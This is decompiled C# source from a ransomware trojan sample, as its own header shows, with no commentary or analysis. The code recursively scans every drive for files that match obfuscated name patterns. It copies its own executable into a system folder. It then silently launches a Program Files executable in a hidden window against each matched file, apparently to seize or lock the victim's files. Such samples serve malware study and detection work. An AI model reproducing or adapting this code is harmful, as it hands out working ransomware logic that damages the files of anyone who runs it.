// Decompiled with JetBrains decompiler
// Type: ___codefort.U
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ___codefort
{
  public sealed class U
  {
    private static string \u0002;

    [DllImport("kernel32.dll", EntryPoint = "GetShortPathName", CharSet = CharSet.Auto)]
    private static extern int \u0002([MarshalAs(UnmanagedType.LPTStr)] string _param0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder _param1, int _param2);

    private static void \u0002(string _param0)
    {
      try
      {
        foreach (string file in Directory.GetFiles(_param0))
        {
          if (file.Contains(I.\u0002(737975021)))
            U.\u0003(file);
          if (file.Contains(I.\u0002(737975030)))
            U.\u0003(file);
        }
        foreach (string directory in Directory.GetDirectories(_param0))
          U.\u0002(directory);
      }
      catch
      {
      }
    }

    public static void \u0002()
    {
      try
      {
        U.\u0002 = Process.GetCurrentProcess().MainModule.FileName;
        foreach (string logicalDrive in Environment.GetLogicalDrives())
          U.\u0002(logicalDrive);
      }
      catch
      {
      }
    }

    private static void \u0003(string _param0)
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string path1 = folderPath.Replace(folderPath.Substring(folderPath.IndexOf(I.\u0002(737969724))), string.Empty) + I.\u0002(737969724);
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + I.\u0002(737975035);
        if (!File.Exists(path))
          return;
        if (!File.Exists(Path.Combine(path1, U.\u0002)))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(path1, U.\u0002));
        StringBuilder stringBuilder1 = new StringBuilder((int) byte.MaxValue);
        U.\u0002(Path.Combine(path1, U.\u0002), stringBuilder1, stringBuilder1.Capacity);
        StringBuilder stringBuilder2 = new StringBuilder((int) byte.MaxValue);
        U.\u0002(_param0, stringBuilder2, stringBuilder2.Capacity);
        try
        {
          ProcessStartInfo startInfo = new ProcessStartInfo();
          string str = I.\u0002(737974930) + stringBuilder2.ToString() + I.\u0002(737969405) + stringBuilder1.ToString();
          startInfo.FileName = path;
          startInfo.Arguments = str;
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          Process.Start(startInfo);
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
  }
}
